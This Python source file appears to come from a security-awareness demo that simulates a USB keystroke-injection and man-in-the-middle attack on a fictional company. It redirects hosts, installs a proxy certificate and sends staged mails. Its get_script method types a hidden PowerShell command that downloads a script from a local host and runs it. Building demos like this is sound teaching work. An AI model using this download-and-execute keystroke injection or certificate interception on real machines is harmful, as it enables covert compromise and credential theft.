#!/usr/bin/env python3

# SPDX-License-Identifier: AGPL-3.0-only

"""
Copyright (C) 2022 Kevin Köster

This program is free software: you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation, either version 3 of the License, or (at your option) any later
version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with
this program. If not, see <https://www.gnu.org/licenses/>.
"""

import sys
import logging
import time
import importlib.resources
import subprocess  # nosec
import ipaddress
import pathlib
import threading

from typing import List

from tkinter import messagebox
from nativeapp.utils.mail import mail_client, mail_program
from nativeapp.utils.browser import browser_program
from nativeapp.utils.admin import admin_app
from nativeapp.utils.usb import usb_monitor
from nativeapp.utils.locale import locale
from nativeapp.config import config
from pynput.keyboard import Controller, Key

from . import set_proxy_cert


def _get_ipv4(interface: str) -> ipaddress.IPv4Address:
    prefix = ""
    if sys.platform == "win32":
        prefix = "wsl"

    # akw not working in wsl
    cmd = [f"{prefix}", "bash", "-c",
           f"ip a | grep {interface} | grep inet"]
    logging.info(f"Calling {cmd}")
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,  # nosec
                         stderr=subprocess.PIPE)
    out, _ = p.communicate()
    out = out.split()[1]
    net = ipaddress.IPv4Interface(out.decode())
    return net.ip


class DuckyDemo:

    def __init__(self):
        self.email_client = mail_client.MailClient(
                "127.0.0.1",
                993,
                465,
                "max.mustermann@nimbus.de",
                "123")
        with importlib.resources.path(
                "demos.uhh_ducky_mitm.resources.mail",
                "mpse_profile.zip") as p:
            mail_profile = p
        with importlib.resources.path(
                "demos.uhh_ducky_mitm.resources.edge",
                "profile_uhh.zip") as p:
            browser_profile = p
        self.email_program = mail_program.MailProgramThunderbird(
                "MPSE", mail_profile)
        self.browser_program = browser_program.BrowserProgramEdge(
                "elite.uhh_mitm", browser_profile)

        self.running = False
        self.admin_client = admin_app.NativeappAdminClient()
        localedir = pathlib.Path(__file__).parent.parent / "locales"
        self.locale = locale.Locale()
        self.locale.add_locale_dir(localedir)
        self.usb_monitor = None
        self.logged_credentials = []

    def add_credentials(self, user, pw):
        self.logged_credentials.append((user, pw))

    def prepare(self):
        # get wsl ip
        ip = _get_ipv4("eth0")

        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"1")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    True, "mail.nimbus.de", "127.0.0.1"))
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    True, "nimbus.de", f"{ip}"))

    def start(self):
        if self.running:
            self.stop()
        self.locale.update_locale(config.EnvironmentConfig.LANGUAGE)
        self.logged_credentials.clear()

        # set hosts entry
        self.running = True
        self.email_program.copy_profile()
        self.browser_program.copy_profile()
        self.browser_program.set_default()
        self.usb_monitor = usb_monitor.USBMonitor(on_connect=self.get_script)

        while not self.email_client.wait_for_smtp_server(20):
            pass

        while not self.email_client.wait_for_imap_server(20):
            pass

        self.email_program.start()

    def stop(self):
        self.running = False
        logging.info("Stopping mail program")
        self.email_program.stop()
        self.browser_program.stop()
        logging.info("Disabling proxy")
        set_proxy_cert.disable_proxy()
        logging.info("reverting admin settings")
        self.admin_client.send_command(
                admin_app.NativeappCommands.DISABLE_USB, b"0")
        self.admin_client.send_command(
                admin_app.NativeappCommands.SET_REDIRECT,
                admin_app.create_host_payload(
                    False, "nimbus.de"))
        if self.usb_monitor:
            self.usb_monitor.stop()
        logging.info("Stop done")

    def _send_mail(self, mail_files: List[str]) -> None:
        print(config.EnvironmentConfig.LANGUAGE)
        for mail_file in mail_files:
            with importlib.resources.path(
                    "demos.uhh_ducky_mitm.resources.mail",
                    mail_file) as mail_path:
                logging.info(f"Getting path for file {mail_file}: {mail_path}")
                self.email_client.send_mail_from_file(mail_path, (0, 0),
                                                      self.locale.translate)

    def send_mails(self) -> None:
        self._send_mail(["pictures.yml"])

    def send_second_mail(self) -> None:
        self._send_mail(["wrong_stick.yml"])

    def send_attacked_mails(self) -> None:
        threading.Timer(5.0, self._send_mail,
                        args=[["project_deleted.yml"]]).start()
        threading.Timer(10.0, self._send_mail,
                        args=[["internal.yml"]]).start()
        threading.Timer(10.0, self.add_credentials,
                        args=["kunden_db",
                              "73ioi2em9JIYddo3CdZ3AY6VQuD6GG1t"]).start()
        threading.Timer(20.0, self._send_mail,
                        args=[["backup.yml"]]).start()
        threading.Timer(30.0, self._send_mail,
                        args=[["it_admin.yml"]]).start()
        threading.Timer(40.0, self._send_mail,
                        args=[["it_test.yml"]]).start()

    def add_cert(self) -> None:
        set_proxy_cert.add_cert()
        set_proxy_cert.enable_and_set_proxy()

    def get_script(self, usb_info) -> None:
        keyboard = Controller()
        keystroke_injection_sleeps = 0.5
        hostname = "127.0.0.1"
        filename = "a.py"
        keyboard.press(Key.cmd)
        keyboard.press("r")
        keyboard.release(Key.cmd)
        keyboard.release("r")
        time.sleep(keystroke_injection_sleeps)
        cmd = "powershell -Windowstyle hidden curl.exe -k https://{0}/{1} -s -o $ENV:Temp/{1} ; python $ENV:Temp/{1}".format(hostname, filename)  # noqa: E501
        keyboard.type(cmd)  # noqa: E501
        time.sleep(keystroke_injection_sleeps)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)

    def show_error_box(self) -> None:
        messagebox.showerror(self.locale.translate("uhh_usb_error_title"),
                             self.locale.translate("uhh_usb_error_msg"))
